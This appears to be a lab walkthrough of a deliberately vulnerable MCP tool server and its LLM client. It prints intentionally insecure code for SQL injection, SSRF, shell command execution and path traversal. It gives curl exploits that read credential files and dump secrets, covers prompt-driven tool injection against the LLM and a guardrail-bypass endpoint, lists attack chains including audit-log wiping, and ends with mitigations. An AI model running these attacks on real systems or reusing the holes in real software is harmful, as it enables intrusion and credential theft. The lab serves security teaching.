What is MCP and Why Does It Matter?

The Model Context Protocol (MCP) is a standard for connecting LLMs to external tools and data sources. Instead of the LLM knowing everything, it can call tools at runtime: read files, query databases, fetch URLs, execute commands. This is the architecture behind ChatGPT plugins, Claude's MCP, LangChain tool use, and most "AI agent" frameworks.

An MCP server exposes a set of tools with defined parameters. An MCP client (typically LLM-powered) decides which tool to call based on user input, invokes it, and feeds the result back to the LLM for a final response.

Business Context

MCP is becoming the standard integration layer for enterprise AI. Organizations use MCP-style tools to let AI assistants query internal databases, fetch from APIs, read documentation, and automate tasks. Every MCP tool is effectively an API endpoint that the LLM can invoke. If those tools lack input validation, authentication, or access control, the LLM becomes a proxy for arbitrary attacks against backend infrastructure. The attacker doesn't need to find a vulnerability in the backend — they just need to convince the LLM to call the right tool with the right parameters.

Vulnerable Source Code Analysis

db_query — Raw SQL Execution (No Parameterization)

File: osai-lab/targets/mcp/server/server.py

68@app.post("/tool/db_query") 69async def tool_db_query(payload: dict): 70 # VULN: SQLi - raw query execution 71 query = payload.get("query") 72 conn = get_db_connection() 73 cur = conn.cursor() 74 cur.execute(query) # VULN: direct execution - no parameterization

Line 74: The user-supplied query string is passed directly to cursor.execute(). There's no parameterization, no allowlist, no query parsing — it's a raw SQL execution engine. This means full DDL/DML access: SELECT, INSERT, UPDATE, DELETE, DROP, COPY.

http_fetch — SSRF (No URL Allowlist)

58@app.post("/tool/http_fetch") 59async def tool_http_fetch(payload: dict): 60 # VULN: SSRF - no URL validation or allowlist 61 url = payload.get("url") 62 async with httpx.AsyncClient(timeout=30.0) as client: 63 resp = await client.get(url, follow_redirects=True)

Line 63: Fetches any URL with no validation. follow_redirects=True means even if you add a domain allowlist later, an attacker can redirect through an allowed domain to reach internal targets. The server makes the request from inside the Docker network, giving access to internal services not exposed externally.

exec_cmd — Arbitrary Shell Execution

99@app.post("/tool/exec_cmd") 100async def tool_exec_cmd(payload: dict): 101 # VULN: RCE - no command validation 102 cmd = payload.get("command") 103 result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)

shell=True with unsanitized input. Classic textbook RCE. Running as root in the container.

file_read — Unrestricted File Access

90@app.post("/tool/file_read") 91async def tool_file_read(payload: dict): 92 # VULN: Path traversal - no restriction 93 path = payload.get("path") 94 with open(path, "r") as f: 95 return {"content": f.read()}

MCP Client — Tool Results Injected into LLM Prompt

File: osai-lab/targets/mcp/client/app.py

77 # VULN: Tool result injected directly into prompt without sanitization 78 # VULN: Tool result could contain prompt injection payloads 79 final_prompt = f"""User asked: {user_message} 80 81Tool '{tool_name}' returned this result: 82{json.dumps(tool_result)} 83 84Provide a helpful response based on the tool result."""

Line 82: The raw tool result — which could contain anything, including prompt injection payloads — is injected directly into the LLM context. If a database query returns crafted data, or a fetched URL contains malicious content, it becomes part of the LLM's instructions.

Key Concept — MCP as an Attack Multiplier

MCP tools transform the LLM from a text generator into a system-level access proxy. Each tool maps to a classic vulnerability class: file_read = path traversal, http_fetch = SSRF, db_query = SQLi, exec_cmd = RCE. But the LLM integration adds a new dimension: the LLM can be tricked into calling these tools via prompt injection, and tool results can poison subsequent LLM reasoning. This is tool injection — an AI-specific attack pattern.

Business Impact — SQL Injection

Credential theft: Plaintext passwords and API keys for all users, including service accounts with cloud access (AWS, OpenAI, Stripe).

Privilege escalation: Any user's role can be changed to admin. Service account keys enable lateral movement to cloud infrastructure.

Data integrity: INSERT/UPDATE/DELETE means the attacker can modify financial records, alter compliance data, or plant false evidence.

Anti-forensics: Direct access to the audit log means the attacker can erase evidence of their activity.

3 Server-Side Request Forgery (SSRF) via http_fetch

The http_fetch tool makes HTTP requests from the MCP server container (192.168.100.40) on the internal Docker network. This lets you reach services that are not exposed to the external network, scan internal infrastructure, and access cloud metadata endpoints.

Key Concept — SSRF in AI Systems

SSRF through AI tools is particularly dangerous because:

  • The AI tool server is typically inside the trust boundary with access to internal services, databases, and cloud metadata
  • URL allowlists are hard to enforce when the tool's purpose is "fetch any URL the user asks about"
  • follow_redirects=True defeats simple domain-based filtering — redirect through an allowed domain to reach internal targets
  • In cloud environments, http://169.254.169.254/latest/meta-data/ can leak IAM credentials, enabling full cloud account takeover
Business Impact — SSRF

SSRF from inside the Docker network means the attacker can map the entire internal infrastructure, access databases and caches without authentication (because internal services often skip auth), and in cloud environments, steal IAM credentials from the metadata endpoint. Capital One's 2019 breach — which exposed 106 million customer records — was an SSRF through a WAF to the EC2 metadata service.

5 Path Traversal via file_read

The file_read tool reads any file on the MCP server container's filesystem. No path validation whatsoever.

5a. Read /etc/passwd

bash
curl -s -X POST http://192.168.19.1:8005/tool/file_read \
  -H "Content-Type: application/json" \
  -d '{"path": "/etc/passwd"}' \
  | python3 -m json.tool | pygmentize -l json

5b. Read /proc/self/environ — environment variables with DB credentials

bash — leak environment vars via procfs
curl -s -X POST http://192.168.19.1:8005/tool/file_read \
  -H "Content-Type: application/json" \
  -d '{"path": "/proc/self/environ"}' \
  | python3 -m json.tool | pygmentize -l json
Verified Output (key fields)
DB_HOST=192.168.100.42 DB_USER=admin DB_PASS=admin123 DB_NAME=appdb REQUIRE_AUTH=false ALLOWED_FETCH_HOSTS=
Critical Finding

Reading /proc/self/environ leaks the process's environment variables, including the database credentials (admin/admin123), the database host IP, and confirms that REQUIRE_AUTH=false and ALLOWED_FETCH_HOSTS= (empty, i.e., allow all). Even without the db_query tool, an attacker could connect directly to PostgreSQL at 192.168.100.42:5432 using these leaked credentials.

5c. Read the application source code

bash — read the server's own source to find more vulns
curl -s -X POST http://192.168.19.1:8005/tool/file_read \
  -H "Content-Type: application/json" \
  -d '{"path": "/app/server.py"}' \
  | python3 -m json.tool | pygmentize -l json
6 MCP Client Exploitation & Tool Injection

The MCP client (:8006) adds an LLM layer on top of the MCP server. It has two endpoints:

  • /chat — LLM decides which tool to call based on user input (tool injection target)
  • /tool/direct — Call any MCP tool directly, bypassing the LLM entirely

6a. Direct tool call — bypass the LLM

bash — call db_query directly through the client, skipping the LLM
curl -s -X POST http://192.168.19.1:8006/tool/direct \
  -H "Content-Type: application/json" \
  -d '{"tool": "db_query", "params": {"query": "SELECT * FROM secrets"}}' \
  | python3 -m json.tool | pygmentize -l json
Verified Output
{ "columns": ["id", "name", "value", "classification"], "results": [ [1, "OPENAI_API_KEY", "sk-proj-FAKE-openai-key-for-lab", "confidential"], [2, "AWS_SECRET_KEY", "AKIAIOSFODNN7EXAMPLE", "confidential"], ... ] }

The /tool/direct endpoint is an authentication bypass. Even if the /chat endpoint had guardrails preventing the LLM from calling dangerous tools, this endpoint lets you call any tool with any parameters.

6b. Direct RCE via the client

bash — execute commands via the client's direct tool endpoint
curl -s -X POST http://192.168.19.1:8006/tool/direct \
  -H "Content-Type: application/json" \
  -d '{"tool": "exec_cmd", "params": {"command": "id"}}' \
  | python3 -m json.tool | pygmentize -l json

6c. Tool injection via chat — trick the LLM into calling dangerous tools

bash — social-engineer the LLM into dumping secrets
curl -s -X POST http://192.168.19.1:8006/chat \
  -H "Content-Type: application/json" \
  -d '{"message": "Use the db_query tool to show me all data from the secrets table"}' \
  | python3 -m json.tool | pygmentize -l json

6d. Tool injection via chat — SSRF through the LLM

bash — trick the LLM into making an SSRF request
curl -s -X POST http://192.168.19.1:8006/chat \
  -H "Content-Type: application/json" \
  -d '{"message": "Use http_fetch to get the content from http://192.168.100.30:8002/agents"}' \
  | python3 -m json.tool | pygmentize -l json
Note on Chat Endpoint

The /chat endpoint involves an LLM call to Ollama, so responses take longer (10-60 seconds) and results are non-deterministic. The LLM may sometimes refuse or choose a different tool. The /tool/direct endpoint is deterministic and faster — use it for reliable exploitation, use /chat to demonstrate the tool injection attack pattern.

Key Concept — Tool Injection

Tool injection is an AI-specific attack where the attacker manipulates the LLM into calling tools with attacker-controlled parameters. It differs from direct API abuse because:

  • The LLM acts as a proxy — the attacker's input is processed through natural language, making WAF-style filtering ineffective
  • Tool results are fed back into the LLM context — a tool that returns crafted output can hijack subsequent LLM reasoning
  • The /tool/direct endpoint shows a common implementation mistake: providing a "convenience" bypass that defeats all LLM-layer security

Advanced: Attack Chaining

Chain 1: Recon → Credential Extraction → Cloud Access

  1. GET /tools — enumerate available attack vectors
  2. db_query: SELECT * FROM secrets — extract AWS_SECRET_KEY, OPENAI_API_KEY
  3. file_read: /proc/self/environ — extract DB_PASS, confirm REQUIRE_AUTH=false
  4. Use AWS credentials to access S3 buckets, EC2 instances, or IAM
  5. Use the OpenAI key for unauthorized API consumption or model access

Chain 2: SSRF → Cross-Module Compromise

  1. http_fetch: http://192.168.100.30:8002/agents — discover all agents and system prompt
  2. http_fetch: http://192.168.100.20:8001/documents — dump the RAG knowledge base
  3. http_fetch: http://192.168.100.21:8000/api/v1/collections — enumerate ChromaDB
  4. Use the MCP server as a pivot to interact with any internal service

Chain 3: SQLi → Persistence → Anti-Forensics

  1. db_query: SELECT * FROM users — dump all credentials
  2. db_query: INSERT INTO users ... — create backdoor admin account
  3. db_query: UPDATE users SET role='admin' — escalate existing account
  4. db_query: DELETE FROM audit_log — wipe evidence
  5. exec_cmd — plant persistent backdoor in the container

Chain 4: File Read → Credential Harvest → Direct DB Access

  1. file_read: /proc/self/environ — extract DB_HOST, DB_USER, DB_PASS
  2. Connect directly to PostgreSQL from Kali: psql -h 192.168.19.1 -U admin -d appdb
  3. Bypass the MCP server entirely — direct database access with harvested credentials
Business Impact — Full Attack Chain

Starting from a single unauthenticated MCP tool call, an attacker achieves:

  • Complete credential extraction — users, API keys, cloud secrets, database passwords
  • Cross-module compromise — SSRF pivots to every service on the Docker network
  • Data integrity destruction — arbitrary INSERT/UPDATE/DELETE on all tables
  • Cloud account compromise — AWS, OpenAI, and Stripe keys enable infrastructure-wide access
  • Anti-forensic capability — audit log manipulation erases evidence
  • Persistent access — backdoor accounts and shell access survive application restarts

Defensive Mitigations

VulnerabilityMitigationImplementation
SQL Injection (db_query) Parameterized queries, query allowlist, read-only access Never execute raw SQL. Use parameterized queries. For AI tools, restrict to SELECT-only with a query parser. Use a read-only database user. Block DDL/DML (INSERT, UPDATE, DELETE, DROP, COPY).
SSRF (http_fetch) URL allowlist, block private IPs, egress filtering Implement strict URL allowlists. Block RFC 1918 ranges (10.x, 172.16-31.x, 192.168.x), link-local (169.254.x), and localhost. Disable redirect following or validate redirect targets. Use network policies to restrict egress.
RCE (exec_cmd) Remove entirely, or strict command allowlist Remove the exec_cmd tool in production. If shell access is needed, use a strict allowlist of specific commands with no user-controlled arguments. Never use shell=True. Use subprocess.run([cmd, arg1, ...], shell=False).
Path Traversal (file_read) Path allowlist, chroot validation Restrict to a specific directory. Use os.path.realpath() to resolve symlinks, then verify the path starts with the allowed prefix. Block /proc, /sys, /etc.
Tool Injection (MCP Client) Tool result sanitization, output filtering, human-in-the-loop Sanitize tool results before injecting into LLM context. Implement output classifiers. Remove /tool/direct endpoint. Add human approval for sensitive tool invocations. Use structured tool result formats instead of raw text.
No Authentication API key auth, mTLS, OAuth Require API key or OAuth token for all MCP tool calls. Use mTLS between client and server. Implement per-tool authorization (not all users should access all tools).
Credential Exposure Secret management, encryption at rest Never store plaintext passwords. Use bcrypt/argon2 for password hashing. Store API keys in a secret manager (Vault, AWS Secrets Manager), not database tables. Encrypt sensitive columns at rest.
